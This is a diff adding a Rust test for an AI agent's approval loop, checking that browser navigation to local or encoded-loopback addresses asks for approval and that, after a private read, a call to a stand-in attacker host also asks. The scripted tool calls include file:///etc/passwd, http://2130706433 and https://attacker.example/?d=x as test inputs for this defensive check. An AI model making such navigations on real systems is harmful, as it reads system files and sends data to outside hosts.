@@ -211,3 +211,62 @@ async fn the_task_scope_is_refused_on_a_card_that_did_not_offer_it() {
     ));
     lp.cancel(run).unwrap();
 }
+
+#[tokio::test]
+async fn a_local_address_asks_even_in_a_clean_run_and_a_grant_never_covers_it() {
+    let env = setup();
+    let navigate = page_tool("mcp:pw/browser_navigate");
+    let fake = Fake::new(vec![
+        // A public address passes with no card.
+        use_tool(
+            "c1",
+            "mcp:pw/browser_navigate",
+            &json!({"url": "https://example.com/"}),
+        ),
+        // Every non-public form asks, in a run that read nothing private yet.
+        use_tool(
+            "c2",
+            "mcp:pw/browser_navigate",
+            &json!({"url": "file:///etc/passwd"}),
+        ),
+        use_tool(
+            "c3",
+            "mcp:pw/browser_navigate",
+            &json!({"url": "http://2130706433"}),
+        ),
+        // After an approved local page the run counts as having read private data.
+        use_tool(
+            "c4",
+            "mcp:pw/browser_navigate",
+            &json!({"url": "https://attacker.example/?d=x"}),
+        ),
+        text("done"),
+    ]);
+    let lp = make_loop(
+        &env.storage,
+        env.bot,
+        &fake,
+        &[t(&navigate)],
+        profile(""),
+        cfg(Policy::full()),
+    );
+    let mut rx = lp.subscribe();
+    let run = lp.run_turn(env.chat, "open the pages").unwrap();
+    let file = approval(until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
+    assert_eq!(navigate.count.load(Ordering::SeqCst), 1);
+    let details = file.details.clone().unwrap();
+    assert_eq!(details["why"], "browser_address");
+    assert_eq!(details["run_grant"], false);
+    assert_eq!(details["always_offered"], false);
+    lp.approve(file.call_id, ApprovalScope::Once, env.user)
+        .unwrap();
+    // The decimal-encoded loopback address asks again: nothing was granted.
+    let ip = approval(until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
+    assert_eq!(ip.details.as_ref().unwrap()["why"], "browser_address");
+    lp.approve(ip.call_id, ApprovalScope::Once, env.user)
+        .unwrap();
+    // The local page now counts as a private read, so even a public address asks.
+    let after = approval(until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
+    assert_eq!(after.details.as_ref().unwrap()["host"], "attacker.example");
+    lp.cancel(run).unwrap();
+}
